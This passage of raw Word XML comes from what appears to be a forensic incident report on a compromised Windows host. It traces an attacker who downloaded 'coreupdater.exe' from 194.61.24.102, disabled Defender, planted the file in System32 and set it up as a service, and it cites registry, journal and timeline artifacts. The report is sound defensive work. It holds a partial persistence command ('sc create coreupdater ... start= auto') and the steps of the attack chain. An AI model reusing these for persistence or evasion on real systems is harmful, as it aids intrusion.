              </w:rPr>
              <w:t>execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1105, T1036.005, T1543.003, T1562.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2019-12-07 09:03:44.539499 → 2020-09-19 03:42:41</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>These are the GUI-level artifacts of C137\Administrator (-500) in RDP session 3.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1) Windows Timeline (L.Administrator ActivitiesCache):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Edge opened "Directory listing for /" at http://194.61.24.102/ at 03:39:29; the window stayed in focus until 03:44:52 (SIDR ActivityHistory row 29 shows the same).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Windows Security (SecHealthUI) opened at 03:39:38 and stayed in focus until 03:39:54. This matches the Defender RTP disable at 03:39:45-03:39:49 (F-007).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2) Download and save:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ComDlg32 OpenSavePidlMRU\exe and \* = This PC\Downloads\coreupdater.exe at 03:40:00.69.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- LastVisitedPidlMRU = PickerHost.exe → This PC\Downloads at 03:40:00.69.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $J: coreupdater.exe.b1jhvkh.partial was renamed to coreupdater.exe in .\Users\Administrator\Downloads at 03:40:00.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3) Move to System32:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ShellBags show the Downloads folder at 03:40:04 and C:\Windows\System32 at 03:40:23.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Windows Timeline Explorer CopyPaste at 03:40:09.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $J RenameNewName of coreupdater.exe in .\Windows\System32 at 03:40:42.254 (same MFT entry, so a move, not a copy).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Explorer jump list f01b4d95cf55d32a records C:\Windows\System32 at 03:40:42.254.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $J StreamChange on the System32 copy up to 03:40:49.33, just before execution at 03:40:49. A Zone.Identifier ADS was probably handled at this point.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4) Command prompt:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- cmd.exe was opened at 03:41:06 and stayed in focus until 03:44:45.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Windows Timeline recorded 4 CopyPaste (clipboard) events in cmd.exe at 03:41:21, 03:42:38, 03:42:41 and 03:42:44. The last three bracket the sc.exe service creation of "coreupdater" at 03:42:42 (7045).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Clipboard payloads were not stored (ClipboardPayload empty), and the memory cmdscan/consoles plugins returned no command history for conhost PID 728.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>These records add to F-008 and F-012 with user-interaction artifacts. The attacker worked interactively over RDP: they browsed the open web directory on 194.61.24.102, used the Windows Security GUI to switch off real-time protection, saved the payload through the Edge Save-As dialog, and moved it by hand to C:\Windows\System32 with a legitimate-sounding name (masquerading).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The clipboard pastes into cmd.exe at the moment the service was created suggest the commands were prepared in advance and pasted, which fits a scripted operator playbook (for example `sc create coreupdater ... start= auto`). The exact commands could not be recovered. This is an inference based on timing.</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03:39:29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge</w:t>
              <w:br/>
              <w:t>Directory listing for / (Microsoft Edge) http://194.61.24.102/ (http://194.61.24.102/) type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI</w:t>
              <w:br/>
              <w:t>Windows Security type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:09</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: end ; Activity: last modified</w:t>
              <w:br/>
              <w:t>Microsoft.Windows.Explorer</w:t>
              <w:br/>
              <w:t>type=CopyPaste</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: end ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\cmd.exe</w:t>
              <w:br/>
              <w:t>type=CopyPaste</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: end ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\cmd.exe</w:t>
              <w:br/>
              <w:t>type=CopyPaste</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: OpenSavePidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened/saved via dialog box</w:t>
              <w:br/>
              <w:t>This PC\Downloads\coreupdater.exe</w:t>
              <w:br/>
              <w:t>exe mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_OpenSavePidlMRU.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: LastVisitedPidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder used by an application (dialog box)</w:t>
              <w:br/>
              <w:t>This PC\Downloads</w:t>
              <w:br/>
              <w:t>appli=PickerHost.exe mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_LastVisitedPidlMRU.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:03:46</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Windows\System32</w:t>
              <w:br/>
              <w:t>Directory System32 MFT=3254 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:03:44.539499</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded)</w:t>
              <w:br/>
              <w:t>C:\Windows\System32</w:t>
              <w:br/>
              <w:t>Windows Explorer Windows 8.1 interactions=1 machine=desktop-sdn1rpt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261025191825_AutomaticDestinations.csv#19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.847956</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\Downloads\coreupdater.exe.b1jhvkh.partial</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35860</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:42.254194</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35942</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (activity history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start</w:t>
              <w:br/>
              <w:t>http://194.61.24.102/</w:t>
              <w:br/>
              <w:t>Microsoft Edge Directory listing for / Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr/DESKTOP-SDN1RPT_Activity_History_Report_20261025_191826.918732700.csv#29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\ProgramData\Microsoft\search\data\applications\windows\Windows.edb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-026: Collection detail: attacker browsed all user profiles in Explorer, built "My Social Security Number.zip" via Explorer, renamed it loot.zip, and permanently deleted it (no Recycle Bin)</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artifact:jump lists (automatic)</w:t>
              <w:br/>
              <w:t>artifact:registry: recentdocs</w:t>
              <w:br/>
              <w:t>artifact:shellbags</w:t>
              <w:br/>
              <w:t>artifact:windows search (activity history)</w:t>
              <w:br/>
              <w:t>artifact:windows timeline (activitiescache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
